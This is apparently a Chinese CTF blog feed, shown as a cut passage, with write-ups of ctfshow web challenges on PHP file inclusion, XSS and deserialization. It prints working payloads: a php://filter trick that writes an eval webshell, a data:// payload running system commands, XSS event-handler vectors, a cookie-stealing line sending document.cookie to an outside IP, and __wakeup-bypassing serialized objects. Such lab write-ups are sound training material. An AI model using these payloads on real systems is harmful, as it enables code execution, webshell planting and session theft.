invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>php:&#x2F;&#x2F;filter的妙用与如何绕过die和exit<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php:&#x2F;&#x2F;filter的妙用</a></p></li><li><p>PHP支持的编码方式<br><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">支持的字符编码</a><br>还有多种编码可以绕过</p></li></ul><p>首先是要通过GET方式一个参数file，以及POST方式一个参数content。对参数file进行了几个过滤。<br>最后写入文件，因为有urldecode，所以需要将file进行二次编码。content参数之前跟了die，这是为了content里即使有php代码也无法执行，那么我们关键是要绕过这个die，这个在上面链接文章里有所提及。</p><p><code>$_POST[&#39;content&#39;]</code> 可以控制协议，即可使用 <code>php://filter</code> 流的 <code>base64-decode</code> 方法将 <code>$content</code> 解码，利用php的 base64_decode函数特性来去除die。因为base64编码只包含<a href="https://foofish.net/base64.html">64个可打印字符</a>，解码base64时，遇到不在其中的字符会跳过，仅将合法字符重新组成一个新的字符串进行解码。</p><p>于是， <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 这段代码最终剩下的只有 <code>phpdie</code> 。因为base64编码4个一组，所以我们再填上两个合法字符，这样便能正常解码，后面传入的content也就能正常解码了，最后我们发现 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 这段代码就不存在了。</p><p>当PHP没有开启short_open_tag时，我们还可以采用rot13编码绕过检测，原理同上面类似。</p><p>于是这道题一般来说有2类方法，用base64绕过或rot13绕过。</p><ul><li><p>base64绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2563%252e%2570%2568%2570</span><br><span class="line">// 这是经过了二次url编码的字符，原来的字符为：</span><br><span class="line">?file=php://filter/read=string.rot13/resource=c.php</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">content=11PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==</span><br><span class="line">// 这是经过了base64编码的字符，原来的字符为：</span><br><span class="line">content=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>rot13绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">与上面的GET相同</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">content=&lt;?cuc riny($_CBFG[1]);?&gt;</span><br><span class="line">// 这是经过了rot13编码的字符，原来的字符为：</span><br><span class="line">content=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure></li></ul><p>成功后，访问c.php，并且POST传参 <code>1=system(&#39;tac f*&#39;);</code><br>即可成功拿到flag</p><h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>咋一看，过滤了蛮多，但是不要紧，直接用data伪协议，把要执行的命令进行base64编码</p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg</span><br></pre></td></tr></table></figure><p>注意如果base64编码中有“&#x3D;”要去掉，否则会造成error</p></li></ol><p>成功拿到flag</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;文件包含不够熟练，需要增加熟练度。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-XSS</title>
    <link href="http://example.com/2022/12/29/ctfshow-web%E5%85%A5%E9%97%A8-XSS/"/>
    <id>http://example.com/2022/12/29/ctfshow-web%E5%85%A5%E9%97%A8-XSS/</id>
    <published>2022-12-28T16:00:00.000Z</published>
    <updated>2023-01-13T14:47:48.504Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于某些原因，想训练让印象更深刻，就不以拿到flag为目的，选择手写弹窗了。<br>如果想拿flag，需要在相应环境下使用类似于以下的语句：<br><code>&lt;body onload=&quot;window.open(&#39;http://IP/&#39;+document.cookie)&quot;&gt;</code></p><span id="more"></span><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>几乎没有任何限制，直接<br><code>&lt;script&gt;alert(0)&lt;/alert&gt;</code><br>或者使用img标签<br><code>&lt;img src=1 onerror=alert(0)&gt;</code><br>或者使用body标签：<br><code>&lt;body onload=&quot;alert(0)&quot;&gt;</code><br>或者使用svg标签：<br><code>&lt;svg onload=&quot;alert(0)&quot;&gt;</code><br>或者使用input标签：<br><code>&lt;input onfocus=&quot;alert(0)&quot; autofocus&gt;</code><br>或者使用video标签：<br><code>&lt;video onloadstart=&quot;alert(0)&quot; src=1 /&gt;</code><br>或者使用style标签：<br><code>&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</code><br>或者使用iframe标签：<br><code>&lt;iframe onload=&quot;alert(0)&quot;&gt;</code></p><h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script标签</p><h1 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h1><p>增加过滤了a标签和img标签</p><h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><p>增加过滤了style标签</p><h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>除了以上的过滤之外，还对video也对空格进行了过滤，使用 <code>/</code> 或 <code>/**/</code> 代替空格绕过即可，比如：<br><code>&lt;iframe/onload=&quot;alert(0)&quot;&gt;</code><br><code>&lt;input/onfocus=&quot;alert(0)&quot;/autofocus&gt;</code><br><code>&lt;body/onload=&quot;alert(0)&quot;&gt;</code><br><code>&lt;body/**/onload=&quot;alert(0)&quot;&gt;</code><br><code>&lt;svg/**/onload=&quot;alert(0)&quot;&gt;</code></p><h1 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h1><p>同上</p><h1 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h1><p>同上</p><h1 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h1><p>过滤了iframe标签</p><h1 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324</h1><p>同上</p><h1 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325</h1><p>同上</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，自己有点摸不着头脑，主要是还没学到后面的东西，看来要加强知识的广度啊！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;由于某些原因，想训练让印象更深刻，就不以拿到flag为目的，选择手写弹窗了。&lt;br&gt;如果想拿flag，需要在相应环境下使用类似于以下的语句：&lt;br&gt;&lt;code&gt;&amp;lt;body onload=&amp;quot;window.open(&amp;#39;http://IP/&amp;#39;+document.cookie)&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="XSS" scheme="http://example.com/categories/CTF/XSS/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="XSS" scheme="http://example.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-Web_php_unserialize</title>
    <link href="http://example.com/2022/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_unserialize/"/>
    <id>http://example.com/2022/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_unserialize/</id>
    <published>2022-12-27T16:00:00.000Z</published>
    <updated>2022-12-28T15:27:26.329Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没注意到细节会吃亏。</p><span id="more"></span><h1 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由源码可知需要绕过魔法函数 <code>__wakeup()</code> ，只需要变量参数数量大于实际数量就可以了。<br>preg_match()函数那里直接用加号绕过，比如: <code>O:4</code> 改为 <code>O:+4</code><br>还需要进行base64加密，需要在脚本中加密才行。<br>因为这里有个坑，这里的 file 变量为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），字符串长度也比实际长度大 2，如果将序列化结果复制到在线的 base64 网站进行编码可能就会丢掉空白字符，所以这里直接在php 代码里进行编码。类似的还有 protected 类型的变量，序列化之后字符串首部会加上%00*%00</p><h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>先根据源码写一个简洁脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$C</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$b</span>);      <span class="comment">//绕过正则表达式过滤</span></span><br><span class="line"><span class="variable">$C</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$C</span>); <span class="comment">//wakeup绕过</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$C</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$C</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到的base64编码构造payload即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure><p>成功拿到flag</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;没注意到细节会吃亏。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/categories/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-反序列化</title>
    <link href="http://example.com/2022/12/27/ctfshow-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2022/12/27/ctfshow-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-12-26T16:00:00.000Z</published>
    <updated>2022-12-29T13:01:52.087Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始刷反序列化的题咯~</p><span id="more"></span><h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>查看源码<br>通过GET传入两个参数username和password,检查参数是否为空后，将参数传入login函数中比较与ctfShowUser类里定义的username和password是否相等，如果相等则能显示flag，否则不能。</p></li><li><p>构造payload<br>本题与反序列化关联不大，就是绕了个圈子作比较罢了。以下是payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure></li></ol><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>查看源码<br>依然需要通过GET传入参数username和password。值也是需要和ctfShowUser类里的一样。<br>区别在于，多了个COOKIE传参，我们需要通过COOKIE传入参数user.<br>由于后面需要参数isVip&#x3D;true，所以写脚本序列化后拿给user即可。</p></li><li><p>写脚本传参</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到序列化后的字符串，赋给user<br>COOKIE: <code>user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br>GET: <code>?username=xxxxxx&amp;password=xxxxxx</code><br>成功拿到flag</p></li></ol><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 